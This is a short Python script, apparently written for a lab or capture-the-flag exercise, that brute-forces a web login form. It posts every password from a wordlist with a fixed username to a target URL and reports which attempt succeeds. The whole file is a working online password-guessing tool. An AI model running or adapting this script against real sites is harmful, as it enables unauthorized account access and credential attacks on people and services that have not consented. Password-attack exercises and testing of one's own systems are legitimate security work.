# first trying brute_all_charcters.properly


import requests
import sys


url= sys.argv[1] # url 
password_file= sys.argv[2] # passwordfile
print("USage: python python_file.py <URL>")


#password="known_password"
username="known_username"
try:
    with open(password_file, "r") as file:
    #   password= []
    #    for line in file:
    #         stripped_lines=line.strip()

    #         if stripped_lines:
    #             modified_lines = stripped_lines + "*"
                
    #             password.append(modified_lines)
        passwords = [line.strip() for line in file if line.strip()] #in short of above line 
except FileNotFoundError:
    print(f"File {password_file} not found, pls ensure it is valid filename")
     
for password in passwords:
    data={
        "username":username,
        "password":password
    }
    try:
        response= requests.post(url, data=data)
        if 'Login successful but the site is temporarily down for security reasons' in response.text:
            print(f"attempt with password':{password} was successful")

        elif'Login failed' in response.text:
            print(f"attempt with password:{password}, failed!")
        else:
            print(f"attempt with password:{password}, recieved unexpected response")
    
    except requests.exceptions.RequestException as e:
        print("An error occured:", e)




                 


